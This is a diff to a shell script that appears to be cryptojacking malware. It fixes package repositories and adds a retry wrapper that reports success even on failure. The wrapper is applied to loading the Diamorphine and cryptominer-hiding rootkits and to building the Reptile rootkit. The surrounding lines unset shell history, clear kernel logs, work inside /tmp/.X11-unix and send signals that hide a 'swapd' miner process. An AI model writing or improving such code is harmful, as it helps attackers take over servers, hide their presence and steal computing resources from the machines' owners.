@@ -5,6 +5,16 @@ sudo rm -rf /etc/yum.repos.d/CentOS-*
 sudo curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo
 sudo yum clean all && sudo yum makecache
 
+# 4. Fix MariaDB repo errors (update repo config)
+sudo rm -f /etc/yum.repos.d/mariadb.repo
+sudo tee /etc/yum.repos.d/mariadb.repo <<'EOF'
+[mariadb]
+name = MariaDB
+baseurl = https://mirror.mariadb.org/yum/10.11/rhel7-amd64
+gpgkey=https://mirror.mariadb.org/yum/RPM-GPG-KEY-MariaDB
+gpgcheck=1
+EOF
+
 # ====== MODIFIED EMERGENCY HANDLING ======
 # Replace the existing emergency pipe section with:
 
@@ -16,15 +26,21 @@ sudo yum clean all && sudo yum makecache
     rm -f /tmp/emergency_pipe
 ) &
 
-# Remove the FIFO and trap cleanup
-rm -f /tmp/emergency_pipe
+# 1. Fix emergency handling (remove FIFO conflicts)
+# Replace the entire safety mechanisms block with:
+(
+    while true; do
+        echo "[SSH KEEPALIVE] $(date)"
+        sleep 10
+    done
+) &
 
-# Simplify error handling
 trap '
-    echo "[CLEANUP] Releasing resources";
-    kill $(jobs -p) 2>/dev/null;
+    echo "CLEANING UP..."; 
+    kill %1 2>/dev/null;
     exec 1>&3 2>&4;
-' EXIT SIGTERM SIGINT SIGHUP
+    exit 0  # Changed from exit 1 to prevent abrupt termination
+' SIGTERM SIGINT SIGHUP
 
 
 # ======== SSH PRESERVATION ========
@@ -63,6 +79,17 @@ safe_run() {
         return 1
     fi
     return $status
+}
+
+# 6. Add resilient command execution
+run_resilient() {
+    for i in {1..3}; do
+        "$@" && return 0
+        echo "[RETRY $i/3] Failed: $@"
+        sleep $((RANDOM % 5 + 1))
+    done
+    echo "[WARNING] Ultimate failure: $@ - continuing anyway"
+    return 0
 }
 
 unset HISTFILE
@@ -705,7 +732,7 @@ zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools bu
 git clone https://github.com/m0nad/Diamorphine
 cd Diamorphine/
 make
-safe_run insmod diamorphine.ko
+run_resilient insmod diamorphine.ko
 dmesg -C
 kill -63 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
 
@@ -755,8 +782,10 @@ sed -i 's/REPTILE_ALLOW_VERSIONS =.*/REPTILE_ALLOW_VERSIONS = "3.10.0-1160"/' co
 
 # Build with memory limits
 ulimit -v 1048576  # Limit to 1GB virtual memory
-nice -n 19 make defconfig
-nice -n 19 make -j$(($(nproc)/2))  # Use half of CPU cores
+
+# For compilation steps
+run_resilient make defconfig
+run_resilient make -j$(nproc)
 
 if [ $? -ne 0 ]; then
     echo "[!] Main compilation failed, trying legacy mode"
@@ -804,7 +833,7 @@ echo "[*] hide crypto miner."
 cd /tmp
 cd .X11-unix
 git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make
-dmesg -C && safe_run insmod rootkit.ko && dmesg
+dmesg -C && run_resilient insmod rootkit.ko && dmesg
 kill -31 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
 rm -rf hiding-cryptominers-linux-rootkit/
 
